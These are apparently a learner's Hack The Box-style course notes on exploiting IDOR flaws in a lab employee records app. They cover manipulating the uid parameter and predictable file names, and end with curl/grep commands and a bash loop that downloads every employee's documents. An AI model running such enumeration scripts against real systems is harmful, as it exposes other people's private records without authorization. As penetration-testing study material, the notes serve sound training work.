Let's start discussing various techniques of exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering, to user privilege escalation.

## Insecure Parameters
---
- Let's start with a basic example that showcases a typical IDOR vulnerability. 
- The exercise below is an **`Employee Manager` web application that hosts employee records**:
	- ![[Pasted image 20260406001220.png]]
- Our web application assumes that **we are logged in as an employee with user id `uid=1` to simplify things**. 
- This would require us to log in with credentials in a real web application, but the rest of the attack would be the same. 
- Once we **click on `Documents`, we are redirected to**
	- ![[Pasted image 20260406001320.png]]

- When we get to the `Documents` page, we see **several documents that belong to our user**. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). 
- Checking the **==file links, we see that they have individual names==**:
	- ![[Pasted image 20260406001359.png]]
- We see that the files have a ==**predictable naming pattern, as the file names appear to be using the user `uid` and the month/year as part of the file name**,== which may allow us to fuzz files for other users. 
- This is the most basic type of IDOR vulnerability and is **called `static file IDOR`**. 
- However, to successfully fuzz other files, we would **assume that they all start with `Invoice` or `Report`**, which may reveal some files but not all. So, let's look for a **more solid IDOR vulnerability.**


- We see that the **==page is setting our `uid` with a `GET` parameter in the URL as (`documents.php?uid=1`)==**. If the web application uses **this `uid` GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents** by simply changing this value. 
- **==If the back-end end of the web application `does` have a proper access control system, we will get some form of `Access Denied`==**. However, given that the web application passes as our `uid` in **clear text as a direct reference, this may indicate poor web application design**, leading to arbitrary access to employee records.
- When we try **changing the `uid` to `?uid=2`**, we don't notice any difference in the page output, as **==we are still getting the same list of documents, and may assume that it still returns our own documents==**:
	- ![[Pasted image 20260406004521.png]]
- However, **`we must be attentive to the page details during any web pentest` and always keep an eye on the ==source code**== and **==page size==**. If we look at the linked files, or if we click on them to view them, **==we will notice that these are indeed different files,==** which appear to be the documents belonging to the employee with `uid=2`:
	- ![[Pasted image 20260406004613.png]]

## Mass Enumeration
---
- We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, **manually accessing files is not efficient** in a real work environment with hundreds or thousands of employees. 
- So, we can either use a tool like **==`Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files==**, which is what we will do.
- We can click on `CTRL+SHIFT+C` in Firefox to enable the `element inspector`, and then click on any of the links to view their HTML source code, and we will get the following:
```html
	<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
	<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>	
```

- We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so **we may `curl` the page and `grep` for this line, as follows:**
```bash
	DrAsstrange@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
	
	<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
	<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
- We may now use specific bash commands to trim the extra parts and only get the document links in the output. 
- However, **==it is a better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep`==** to only get the document links, as follows:
```bash
	DrAsstrange@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
	
	/documents/Invoice_3_06_2020.pdf
	/documents/Report_3_01_2020.pdf
```
- Now, we can use a **simple `for` loop to loop over the `uid` parameter and return the document of all employees,** and then **use `wget` to download each document link:**
```bash
	#!/bin/bash
	url="http://SERVER_IP:PORT"
	
	for i in {1..10}; do
	        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
	                wget -q $url/$link
	        done
	done
```
